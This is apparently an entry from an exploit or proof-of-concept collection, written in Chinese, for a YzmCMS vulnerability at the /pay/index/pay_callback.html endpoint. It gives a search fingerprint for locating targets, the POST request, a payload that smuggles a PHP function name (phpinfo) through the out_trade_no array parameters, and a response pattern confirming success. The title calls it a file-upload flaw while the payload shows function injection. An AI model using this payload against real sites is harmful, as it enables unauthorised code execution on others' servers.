# YzmCMS内容管理系统pay_callback.html文件上传漏洞

YzmCMS ｜ 文件上传 ｜ —
- **指纹**：`app="yzmcms"`
- **请求**：`POST /pay/index/pay_callback.html HTTP/1.1`

**Payload**
```
out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo
```
- **响应特征**：200 ^(?=.*?PHP)(?=.*?Version).*?$